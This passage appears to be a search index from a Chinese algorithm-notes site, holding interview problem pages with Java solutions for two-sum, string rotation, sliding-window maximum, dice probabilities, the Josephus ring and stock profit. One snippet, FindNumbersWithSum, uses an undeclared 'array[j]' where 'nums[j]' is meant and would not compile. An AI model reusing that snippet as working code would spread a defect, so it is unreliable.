\u8FDB\u884C\u5F02\u6216\u3002\u800C\u4E14\u8FD9\u4E9B\u76F8\u7B49\u7684\u5143\u7D20\u5F02\u6216\u7684\u7ED3\u679C\u4E3A 0\uFF0C\u56E0\u6B64\u6700\u540E z \u548C k \u53EA\u662F\u4E0D\u76F8\u7B49\u7684\u4E24\u4E2A\u5143\u7D20\u4E0E 0 \u5F02\u6216\u7684\u7ED3\u679C\uFF0C\u4E5F\u5C31\u662F\u4E0D\u76F8\u7B49\u4E24\u4E2A\u5143\u7D20\u672C\u8EAB\u3002
\u4E0B\u9762\u7684\u89E3\u6CD5\u4E2D\uFF0Cnum1 \u548C num2 \u6570\u7EC4\u7684\u7B2C\u4E00\u4E2A\u5143\u7D20\u662F\u7528\u6765\u4FDD\u6301\u8FD4\u56DE\u503C\u7684... \u5B9E\u9645\u5F00\u53D1\u4E2D\u4E0D\u63A8\u8350\u8FD9\u79CD\u8FD4\u56DE\u503C\u7684\u65B9\u5F0F\u3002
public int[] FindNumsAppearOnce (int[] nums) { int[] res = new int[2]; int diff = 0; for (int num : nums) diff ^= num; diff &= -diff; for (int num : nums) { if ((num & diff) == 0) res[0] ^= num; else res[1] ^= num; } if (res[0] > res[1]) { swap(res); } return res;
} private void swap(int[] nums) { int t = nums[0]; nums[0] = nums[1]; nums[1] = t;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/57.1%20%E5%92%8C%E4%B8%BA%20S%20%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%95%B0%E5%AD%97.html",title:"57.1 \u548C\u4E3A S \u7684\u4E24\u4E2A\u6570\u5B57",pathLocale:"/",contents:[{header:"57.1 \u548C\u4E3A S \u7684\u4E24\u4E2A\u6570\u5B57",slug:"_57-1-\u548C\u4E3A-s-\u7684\u4E24\u4E2A\u6570\u5B57",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u5728\u6709\u5E8F\u6570\u7EC4\u4E2D\u627E\u51FA\u4E24\u4E2A\u6570\uFF0C\u4F7F\u5F97\u548C\u4E3A\u7ED9\u5B9A\u7684\u6570 S\u3002\u5982\u679C\u6709\u591A\u5BF9\u6570\u5B57\u7684\u548C\u7B49\u4E8E S\uFF0C\u8F93\u51FA\u4E24\u4E2A\u6570\u7684\u4E58\u79EF\u6700\u5C0F\u7684\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4F7F\u7528\u53CC\u6307\u9488\uFF0C\u4E00\u4E2A\u6307\u9488\u6307\u5411\u5143\u7D20\u8F83\u5C0F\u7684\u503C\uFF0C\u4E00\u4E2A\u6307\u9488\u6307\u5411\u5143\u7D20\u8F83\u5927\u7684\u503C\u3002\u6307\u5411\u8F83\u5C0F\u5143\u7D20\u7684\u6307\u9488\u4ECE\u5934\u5411\u5C3E\u904D\u5386\uFF0C\u6307\u5411\u8F83\u5927\u5143\u7D20\u7684\u6307\u9488\u4ECE\u5C3E\u5411\u5934\u904D\u5386\u3002 \u5982\u679C\u4E24\u4E2A\u6307\u9488\u6307\u5411\u5143\u7D20\u7684\u548C sum == target\uFF0C\u90A3\u4E48\u8FD9\u4E24\u4E2A\u5143\u7D20\u5373\u4E3A\u6240\u6C42\u3002
\u5982\u679C sum > target\uFF0C\u79FB\u52A8\u8F83\u5927\u7684\u5143\u7D20\uFF0C\u4F7F sum \u53D8\u5C0F\u4E00\u4E9B\uFF1B
\u5982\u679C sum < target\uFF0C\u79FB\u52A8\u8F83\u5C0F\u7684\u5143\u7D20\uFF0C\u4F7F sum \u53D8\u5927\u4E00\u4E9B\u3002 public ArrayList<Integer> FindNumbersWithSum(int[] nums, int target) { int i = 0, j = nums.length - 1; while (i < j) { int cur = nums[i] + array[j]; if (cur == target) return new ArrayList<>(Arrays.asList(nums[i], nums[j])); if (cur < target) i++; else j--; } return new ArrayList<>();
}`}]},{path:"/%E9%A2%98%E8%A7%A3/57.2%20%E5%92%8C%E4%B8%BA%20S%20%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%AD%A3%E6%95%B0%E5%BA%8F%E5%88%97.html",title:"57.2 \u548C\u4E3A S \u7684\u8FDE\u7EED\u6B63\u6570\u5E8F\u5217",pathLocale:"/",contents:[{header:"57.2 \u548C\u4E3A S \u7684\u8FDE\u7EED\u6B63\u6570\u5E8F\u5217",slug:"_57-2-\u548C\u4E3A-s-\u7684\u8FDE\u7EED\u6B63\u6570\u5E8F\u5217",content:""},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0-1",content:`\u8F93\u51FA\u6240\u6709\u548C\u4E3A S \u7684\u8FDE\u7EED\u6B63\u6570\u5E8F\u5217\u3002\u4F8B\u5982\u548C\u4E3A 100 \u7684\u8FDE\u7EED\u5E8F\u5217\u6709\uFF1A
[9, 10, 11, 12, 13, 14, 15, 16]
[18, 19, 20, 21, 22]\u3002`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public ArrayList<ArrayList<Integer>> FindContinuousSequence(int sum) { ArrayList<ArrayList<Integer>> ret = new ArrayList<>(); int start = 1, end = 2; int curSum = 3; while (end < sum) { if (curSum > sum) { curSum -= start; start++; } else if (curSum < sum) { end++; curSum += end; } else { ArrayList<Integer> list = new ArrayList<>(); for (int i = start; i <= end; i++) list.add(i); ret.add(list); curSum -= start; start++; end++; curSum += end; } } return ret;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/58.1%20%E7%BF%BB%E8%BD%AC%E5%8D%95%E8%AF%8D%E9%A1%BA%E5%BA%8F%E5%88%97.html",title:"58.1 \u7FFB\u8F6C\u5355\u8BCD\u987A\u5E8F\u5217",pathLocale:"/",contents:[{header:"58.1 \u7FFB\u8F6C\u5355\u8BCD\u987A\u5E8F\u5217",slug:"_58-1-\u7FFB\u8F6C\u5355\u8BCD\u987A\u5E8F\u5217",content:""},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0-1",content:`Input:
"I am a student." Output:
"student. a am I"`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u5148\u7FFB\u8F6C\u6BCF\u4E2A\u5355\u8BCD\uFF0C\u518D\u7FFB\u8F6C\u6574\u4E2A\u5B57\u7B26\u4E32\u3002
\u9898\u76EE\u5E94\u8BE5\u6709\u4E00\u4E2A\u9690\u542B\u6761\u4EF6\uFF0C\u5C31\u662F\u4E0D\u80FD\u7528\u989D\u5916\u7684\u7A7A\u95F4\u3002\u867D\u7136 Java \u7684\u9898\u76EE\u8F93\u5165\u53C2\u6570\u4E3A String \u7C7B\u578B\uFF0C\u9700\u8981\u5148\u521B\u5EFA\u4E00\u4E2A\u5B57\u7B26\u6570\u7EC4\u4F7F\u5F97\u7A7A\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\uFF0C\u4F46\u662F\u6B63\u786E\u7684\u53C2\u6570\u7C7B\u578B\u5E94\u8BE5\u548C\u539F\u4E66\u4E00\u6837\uFF0C\u4E3A\u5B57\u7B26\u6570\u7EC4\uFF0C\u5E76\u4E14\u53EA\u80FD\u4F7F\u7528\u8BE5\u5B57\u7B26\u6570\u7EC4\u7684\u7A7A\u95F4\u3002\u4EFB\u4F55\u4F7F\u7528\u4E86\u989D\u5916\u7A7A\u95F4\u7684\u89E3\u6CD5\u5728\u9762\u8BD5\u65F6\u90FD\u4F1A\u5927\u6253\u6298\u6263\uFF0C\u5305\u62EC\u9012\u5F52\u89E3\u6CD5\u3002
public String ReverseSentence(String str) { int n = str.length(); char[] chars = str.toCharArray(); int i = 0, j = 0; while (j <= n) { if (j == n || chars[j] == ' ') { reverse(chars, i, j - 1); i = j + 1; } j++; } reverse(chars, 0, n - 1); return new String(chars);
} private void reverse(char[] c, int i, int j) { while (i < j) swap(c, i++, j--);
} private void swap(char[] c, int i, int j) { char t = c[i]; c[i] = c[j]; c[j] = t;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/58.2%20%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2.html",title:"58.2 \u5DE6\u65CB\u8F6C\u5B57\u7B26\u4E32",pathLocale:"/",contents:[{header:"58.2 \u5DE6\u65CB\u8F6C\u5B57\u7B26\u4E32",slug:"_58-2-\u5DE6\u65CB\u8F6C\u5B57\u7B26\u4E32",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u5C06\u5B57\u7B26\u4E32 S \u4ECE\u7B2C K \u4F4D\u7F6E\u5206\u9694\u6210\u4E24\u4E2A\u5B50\u5B57\u7B26\u4E32\uFF0C\u5E76\u4EA4\u6362\u8FD9\u4E24\u4E2A\u5B50\u5B57\u7B26\u4E32\u7684\u4F4D\u7F6E\u3002
Input:
S="abcXYZdef"
K=3 Output:
"XYZdefabc"`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u5148\u5C06 "abc" \u548C "XYZdef" \u5206\u522B\u7FFB\u8F6C\uFF0C\u5F97\u5230 "cbafedZYX"\uFF0C\u7136\u540E\u518D\u628A\u6574\u4E2A\u5B57\u7B26\u4E32\u7FFB\u8F6C\u5F97\u5230 "XYZdefabc"\u3002
public String LeftRotateString(String str, int n) { if (n >= str.length()) return str; char[] chars = str.toCharArray(); reverse(chars, 0, n - 1); reverse(chars, n, chars.length - 1); reverse(chars, 0, chars.length - 1); return new String(chars);
} private void reverse(char[] chars, int i, int j) { while (i < j) swap(chars, i++, j--);
} private void swap(char[] chars, int i, int j) { char t = chars[i]; chars[i] = chars[j]; chars[j] = t;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/59.%20%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%BC.html",title:"59. \u6ED1\u52A8\u7A97\u53E3\u7684\u6700\u5927\u503C",pathLocale:"/",contents:[{header:"59. \u6ED1\u52A8\u7A97\u53E3\u7684\u6700\u5927\u503C",slug:"_59-\u6ED1\u52A8\u7A97\u53E3\u7684\u6700\u5927\u503C",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u7ED9\u5B9A\u4E00\u4E2A\u6570\u7EC4\u548C\u6ED1\u52A8\u7A97\u53E3\u7684\u5927\u5C0F\uFF0C\u627E\u51FA\u6240\u6709\u6ED1\u52A8\u7A97\u53E3\u91CC\u6570\u503C\u7684\u6700\u5927\u503C\u3002
\u4F8B\u5982\uFF0C\u5982\u679C\u8F93\u5165\u6570\u7EC4 {2, 3, 4, 2, 6, 2, 5, 1} \u53CA\u6ED1\u52A8\u7A97\u53E3\u7684\u5927\u5C0F 3\uFF0C\u90A3\u4E48\u4E00\u5171\u5B58\u5728 6 \u4E2A\u6ED1\u52A8\u7A97\u53E3\uFF0C\u4ED6\u4EEC\u7684\u6700\u5927\u503C\u5206\u522B\u4E3A {4, 4, 6, 6, 6, 5}\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201104020702453.png" width="500px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u7EF4\u62A4\u4E00\u4E2A\u5927\u5C0F\u4E3A\u7A97\u53E3\u5927\u5C0F\u7684\u5927\u9876\u5806\uFF0C\u9876\u5806\u5143\u7D20\u5219\u4E3A\u5F53\u524D\u7A97\u53E3\u7684\u6700\u5927\u503C\u3002
\u5047\u8BBE\u7A97\u53E3\u7684\u5927\u5C0F\u4E3A M\uFF0C\u6570\u7EC4\u7684\u957F\u5EA6\u4E3A N\u3002\u5728\u7A97\u53E3\u5411\u53F3\u79FB\u52A8\u65F6\uFF0C\u9700\u8981\u5148\u5728\u5806\u4E2D\u5220\u9664\u79BB\u5F00\u7A97\u53E3\u7684\u5143\u7D20\uFF0C\u5E76\u5C06\u65B0\u5230\u8FBE\u7684\u5143\u7D20\u6DFB\u52A0\u5230\u5806\u4E2D\uFF0C\u8FD9\u4E24\u4E2A\u64CD\u4F5C\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u90FD\u4E3A log2M\uFF0C\u56E0\u6B64\u7B97\u6CD5\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(Nlog2M)\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6\u4E3A O(M)\u3002
public ArrayList<Integer> maxInWindows(int[] num, int size) { ArrayList<Integer> ret = new ArrayList<>(); if (size > num.length || size < 1) return ret; PriorityQueue<Integer> heap = new PriorityQueue<>((o1, o2) -> o2 - o1); /* \u5927\u9876\u5806 */ for (int i = 0; i < size; i++) heap.add(num[i]); ret.add(heap.peek()); for (int i = 0, j = i + size; j < num.length; i++, j++) { /* \u7EF4\u62A4\u4E00\u4E2A\u5927\u5C0F\u4E3A size \u7684\u5927\u9876\u5806 */ heap.remove(num[i]); heap.add(num[j]); ret.add(heap.peek()); } return ret;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/6.%20%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8.html",title:"6. \u4ECE\u5C3E\u5230\u5934\u6253\u5370\u94FE\u8868",pathLocale:"/",contents:[{header:"6. \u4ECE\u5C3E\u5230\u5934\u6253\u5370\u94FE\u8868",slug:"_6-\u4ECE\u5C3E\u5230\u5934\u6253\u5370\u94FE\u8868",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u4ECE\u5C3E\u5230\u5934\u53CD\u8FC7\u6765\u6253\u5370\u51FA\u6BCF\u4E2A\u7ED3\u70B9\u7684\u503C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f5792051-d9b2-4ca4-a234-a4a2de3d5a57.png" width="300px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:""},{header:"1. \u4F7F\u7528\u9012\u5F52",slug:"_1-\u4F7F\u7528\u9012\u5F52",content:`\u8981\u9006\u5E8F\u6253\u5370\u94FE\u8868 1->2->3\uFF083,2,1)\uFF0C\u53EF\u4EE5\u5148\u9006\u5E8F\u6253\u5370\u94FE\u8868 2->3(3,2)\uFF0C\u6700\u540E\u518D\u6253\u5370\u7B2C\u4E00\u4E2A\u8282\u70B9 1\u3002\u800C\u94FE\u8868 2->3 \u53EF\u4EE5\u770B\u6210\u4E00\u4E2A\u65B0\u7684\u94FE\u8868\uFF0C\u8981\u9006\u5E8F\u6253\u5370\u8BE5\u94FE\u8868\u53EF\u4EE5\u7EE7\u7EED\u4F7F\u7528\u6C42\u89E3\u51FD\u6570\uFF0C\u4E5F\u5C31\u662F\u5728\u6C42\u89E3\u51FD\u6570\u4E2D\u8C03\u7528\u81EA\u5DF1\uFF0C\u8FD9\u5C31\u662F\u9012\u5F52\u51FD\u6570\u3002
public ArrayList<Integer> printListFromTailToHead(ListNode listNode) { ArrayList<Integer> ret = new ArrayList<>(); if (listNode != null) { ret.addAll(printListFromTailToHead(listNode.next)); ret.add(listNode.val); } return ret;
}`},{header:"2. \u4F7F\u7528\u5934\u63D2\u6CD5",slug:"_2-\u4F7F\u7528\u5934\u63D2\u6CD5",content:`\u5934\u63D2\u6CD5\u987E\u540D\u601D\u4E49\u662F\u5C06\u8282\u70B9\u63D2\u5165\u5230\u5934\u90E8\uFF1A\u5728\u904D\u5386\u539F\u59CB\u94FE\u8868\u65F6\uFF0C\u5C06\u5F53\u524D\u8282\u70B9\u63D2\u5165\u65B0\u94FE\u8868\u7684\u5934\u90E8\uFF0C\u4F7F\u5176\u6210\u4E3A\u7B2C\u4E00\u4E2A\u8282\u70B9\u3002
\u94FE\u8868\u7684\u64CD\u4F5C\u9700\u8981\u7EF4\u62A4\u540E\u7EE7\u5173\u7CFB\uFF0C\u4F8B\u5982\u5728\u67D0\u4E2A\u8282\u70B9 node1 \u4E4B\u540E\u63D2\u5165\u4E00\u4E2A\u8282\u70B9 node2\uFF0C\u6211\u4EEC\u53EF\u4EE5\u901A\u8FC7\u4FEE\u6539\u540E\u7EE7\u5173\u7CFB\u6765\u5B9E\u73B0\uFF1A
node3 = node1.next;
node2.next = node3;
node1.next = node2;
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/58c8e370-3bec-4c2b-bf17-c8d34345dd17.gif" width="220px">
\u4E3A\u4E86\u80FD\u5C06\u4E00\u4E2A\u8282\u70B9\u63D2\u5165\u5934\u90E8\uFF0C\u6211\u4EEC\u5F15\u5165\u4E86\u4E00\u4E2A\u53EB\u5934\u7ED3\u70B9\u7684\u8F85\u52A9\u8282\u70B9\uFF0C\u8BE5\u8282\u70B9\u4E0D\u5B58\u50A8\u503C\uFF0C\u53EA\u662F\u4E3A\u4E86\u65B9\u4FBF\u8FDB\u884C\u63D2\u5165\u64CD\u4F5C\u3002\u4E0D\u8981\u5C06\u5934\u7ED3\u70B9\u4E0E\u7B2C\u4E00\u4E2A\u8282\u70B9\u6DF7\u8D77\u6765\uFF0C\u7B2C\u4E00\u4E2A\u8282\u70B9\u662F\u94FE\u8868\u4E2D\u7B2C\u4E00\u4E2A\u771F\u6B63\u5B58\u50A8\u503C\u7684\u8282\u70B9\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0dae7e93-cfd1-4bd3-97e8-325b032b716f-1572687622947.gif" width="420px">
public ArrayList<Integer> printListFromTailToHead(ListNode listNode) { // \u5934\u63D2\u6CD5\u6784\u5EFA\u9006\u5E8F\u94FE\u8868 ListNode head = new ListNode(-1); while (listNode != null) { ListNode memo = listNode.next; listNode.next = head.next; head.next = listNode; listNode = memo; } // \u6784\u5EFA ArrayList ArrayList<Integer> ret = new ArrayList<>(); head = head.next; while (head != null) { ret.add(head.val); head = head.next; } return ret;
}`},{header:"3. \u4F7F\u7528\u6808",slug:"_3-\u4F7F\u7528\u6808",content:`\u6808\u5177\u6709\u540E\u8FDB\u5148\u51FA\u7684\u7279\u70B9\uFF0C\u5728\u904D\u5386\u94FE\u8868\u65F6\u5C06\u503C\u6309\u987A\u5E8F\u653E\u5165\u6808\u4E2D\uFF0C\u6700\u540E\u51FA\u6808\u7684\u987A\u5E8F\u5373\u4E3A\u9006\u5E8F\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9d1deeba-4ae1-41dc-98f4-47d85b9831bc.gif" width="340px">
public ArrayList<Integer> printListFromTailToHead(ListNode listNode) { Stack<Integer> stack = new Stack<>(); while (listNode != null) { stack.add(listNode.val); listNode = listNode.next; } ArrayList<Integer> ret = new ArrayList<>(); while (!stack.isEmpty()) ret.add(stack.pop()); return ret;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/60.%20n%20%E4%B8%AA%E9%AA%B0%E5%AD%90%E7%9A%84%E7%82%B9%E6%95%B0.html",title:"60. n \u4E2A\u9AB0\u5B50\u7684\u70B9\u6570",pathLocale:"/",contents:[{header:"60. n \u4E2A\u9AB0\u5B50\u7684\u70B9\u6570",slug:"_60-n-\u4E2A\u9AB0\u5B50\u7684\u70B9\u6570",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"Lintcode"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u628A n \u4E2A\u9AB0\u5B50\u6254\u5728\u5730\u4E0A\uFF0C\u6C42\u70B9\u6570\u548C\u4E3A s \u7684\u6982\u7387\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/195f8693-5ec4-4987-8560-f25e365879dd.png" width="300px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:""},{header:"\u52A8\u6001\u89C4\u5212",slug:"\u52A8\u6001\u89C4\u5212",content:`\u4F7F\u7528\u4E00\u4E2A\u4E8C\u7EF4\u6570\u7EC4 dp \u5B58\u50A8\u70B9\u6570\u51FA\u73B0\u7684\u6B21\u6570\uFF0C\u5176\u4E2D dp[i][j] \u8868\u793A\u524D i \u4E2A\u9AB0\u5B50\u4EA7\u751F\u70B9\u6570 j \u7684\u6B21\u6570\u3002
\u7A7A\u95F4\u590D\u6742\u5EA6\uFF1AO(N2)
public List<Map.Entry<Integer, Double>> dicesSum(int n) { final int face = 6; final int pointNum = face * n; long[][] dp = new long[n + 1][pointNum + 1]; for (int i = 1; i <= face; i++) dp[1][i] = 1; for (int i = 2; i <= n; i++) for (int j = i; j <= pointNum; j++) /* \u4F7F\u7528 i \u4E2A\u9AB0\u5B50\u6700\u5C0F\u70B9\u6570\u4E3A i */ for (int k = 1; k <= face && k <= j; k++) dp[i][j] += dp[i - 1][j - k]; final double totalNum = Math.pow(6, n); List<Map.Entry<Integer, Double>> ret = new ArrayList<>(); for (int i = n; i <= pointNum; i++) ret.add(new AbstractMap.SimpleEntry<>(i, dp[n][i] / totalNum)); return ret;
}`},{header:"\u52A8\u6001\u89C4\u5212 + \u65CB\u8F6C\u6570\u7EC4",slug:"\u52A8\u6001\u89C4\u5212-\u65CB\u8F6C\u6570\u7EC4",content:`\u7A7A\u95F4\u590D\u6742\u5EA6\uFF1AO(N)
public List<Map.Entry<Integer, Double>> dicesSum(int n) { final int face = 6; final int pointNum = face * n; long[][] dp = new long[2][pointNum + 1]; for (int i = 1; i <= face; i++) dp[0][i] = 1; int flag = 1; /* \u65CB\u8F6C\u6807\u8BB0 */ for (int i = 2; i <= n; i++, flag = 1 - flag) { for (int j = 0; j <= pointNum; j++) dp[flag][j] = 0; /* \u65CB\u8F6C\u6570\u7EC4\u6E05\u96F6 */ for (int j = i; j <= pointNum; j++) for (int k = 1; k <= face && k <= j; k++) dp[flag][j] += dp[1 - flag][j - k]; } final double totalNum = Math.pow(6, n); List<Map.Entry<Integer, Double>> ret = new ArrayList<>(); for (int i = n; i <= pointNum; i++) ret.add(new AbstractMap.SimpleEntry<>(i, dp[1 - flag][i] / totalNum)); return ret;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/61.%20%E6%89%91%E5%85%8B%E7%89%8C%E9%A1%BA%E5%AD%90.html",title:"61. \u6251\u514B\u724C\u987A\u5B50",pathLocale:"/",contents:[{header:"61. \u6251\u514B\u724C\u987A\u5B50",slug:"_61-\u6251\u514B\u724C\u987A\u5B50",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u4E94\u5F20\u724C\uFF0C\u5176\u4E2D\u5927\u5C0F\u9B3C\u4E3A\u765E\u5B50\uFF0C\u724C\u9762\u4E3A 0\u3002\u5224\u65AD\u8FD9\u4E94\u5F20\u724C\u662F\u5426\u80FD\u7EC4\u6210\u987A\u5B50\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/eaa506b6-0747-4bee-81f8-3cda795d8154.png" width="350px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public boolean isContinuous(int[] nums) { if (nums.length < 5) return false; Arrays.sort(nums); // \u7EDF\u8BA1\u765E\u5B50\u6570\u91CF int cnt = 0; for (int num : nums) if (num == 0) cnt++; // \u4F7F\u7528\u765E\u5B50\u53BB\u8865\u5168\u4E0D\u8FDE\u7EED\u7684\u987A\u5B50 for (int i = cnt; i < nums.length - 1; i++) { if (nums[i + 1] == nums[i]) return false; cnt -= nums[i + 1] - nums[i] - 1; } return cnt >= 0;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/62.%20%E5%9C%86%E5%9C%88%E4%B8%AD%E6%9C%80%E5%90%8E%E5%89%A9%E4%B8%8B%E7%9A%84%E6%95%B0.html",title:"62. \u5706\u5708\u4E2D\u6700\u540E\u5269\u4E0B\u7684\u6570",pathLocale:"/",contents:[{header:"62. \u5706\u5708\u4E2D\u6700\u540E\u5269\u4E0B\u7684\u6570",slug:"_62-\u5706\u5708\u4E2D\u6700\u540E\u5269\u4E0B\u7684\u6570",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u8BA9\u5C0F\u670B\u53CB\u4EEC\u56F4\u6210\u4E00\u4E2A\u5927\u5708\u3002\u7136\u540E\uFF0C\u968F\u673A\u6307\u5B9A\u4E00\u4E2A\u6570 m\uFF0C\u8BA9\u7F16\u53F7\u4E3A 0 \u7684\u5C0F\u670B\u53CB\u5F00\u59CB\u62A5\u6570\u3002\u6BCF\u6B21\u558A\u5230 m-1 \u7684\u90A3\u4E2A\u5C0F\u670B\u53CB\u8981\u51FA\u5217\u5531\u9996\u6B4C\uFF0C\u7136\u540E\u53EF\u4EE5\u5728\u793C\u54C1\u7BB1\u4E2D\u4EFB\u610F\u7684\u6311\u9009\u793C\u7269\uFF0C\u5E76\u4E14\u4E0D\u518D\u56DE\u5230\u5708\u4E2D\uFF0C\u4ECE\u4ED6\u7684\u4E0B\u4E00\u4E2A\u5C0F\u670B\u53CB\u5F00\u59CB\uFF0C\u7EE7\u7EED 0...m-1 \u62A5\u6570 .... \u8FD9\u6837\u4E0B\u53BB .... \u76F4\u5230\u5269\u4E0B\u6700\u540E\u4E00\u4E2A\u5C0F\u670B\u53CB\uFF0C\u53EF\u4EE5\u4E0D\u7528\u8868\u6F14\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u7EA6\u745F\u592B\u73AF\uFF0C\u5706\u5708\u957F\u5EA6\u4E3A n \u7684\u89E3\u53EF\u4EE5\u770B\u6210\u957F\u5EA6\u4E3A n-1 \u7684\u89E3\u518D\u52A0\u4E0A\u62A5\u6570\u7684\u957F\u5EA6 m\u3002\u56E0\u4E3A\u662F\u5706\u5708\uFF0C\u6240\u4EE5\u6700\u540E\u9700\u8981\u5BF9 n \u53D6\u4F59\u3002
public int LastRemaining_Solution(int n, int m) { if (n == 0) /* \u7279\u6B8A\u8F93\u5165\u7684\u5904\u7406 */ return -1; if (n == 1) /* \u9012\u5F52\u8FD4\u56DE\u6761\u4EF6 */ return 0; return (LastRemaining_Solution(n - 1, m) + m) % n;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/63.%20%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6.html",title:"63. \u80A1\u7968\u7684\u6700\u5927\u5229\u6DA6",pathLocale:"/",contents:[{header:"63. \u80A1\u7968\u7684\u6700\u5927\u5229\u6DA6",slug:"_63-\u80A1\u7968\u7684\u6700\u5927\u5229\u6DA6",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"Leetcode\uFF1A121. Best Time to Buy and Sell Stock"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u53EF\u4EE5\u6709\u4E00\u6B21\u4E70\u5165\u548C\u4E00\u6B21\u5356\u51FA\uFF0C\u4E70\u5165\u5FC5\u987B\u5728\u524D\u3002\u6C42\u6700\u5927\u6536\u76CA\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/42661013-750f-420b-b3c1-437e9a11fb65.png" width="220px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4F7F\u7528\u8D2A\u5FC3\u7B56\u7565\uFF0C\u5047\u8BBE\u7B2C i \u8F6E\u8FDB\u884C\u5356\u51FA\u64CD\u4F5C\uFF0C\u4E70\u5165\u64CD\u4F5C\u4EF7\u683C\u5E94\u8BE5\u5728 i \u4E4B\u524D\u5E76\u4E14\u4EF7\u683C\u6700\u4F4E\u3002\u56E0\u6B64\u5728\u904D\u5386\u6570\u7EC4\u65F6\u8BB0\u5F55\u5F53\u524D\u6700\u4F4E\u7684\u4E70\u5165\u4EF7\u683C\uFF0C\u5E76\u4E14\u5C1D\u8BD5\u5C06\u6BCF\u4E2A\u4F4D\u7F6E\u90FD\u4F5C\u4E3A\u5356\u51FA\u4EF7\u683C\uFF0C\u53D6\u6536\u76CA\u6700\u5927\u7684\u5373\u53EF\u3002
public int maxProfit(int[] prices) { if (prices == null || prices.length == 0) return 0; int soFarMin = prices[0]; int maxProfit = 0; for (int i = 1; i < prices.length; i++) { soFarMin = Math.min(soFarMin, prices[i]); maxProfit = Math.max(maxProfit, prices[i] - soFarMin); } return maxProfit;
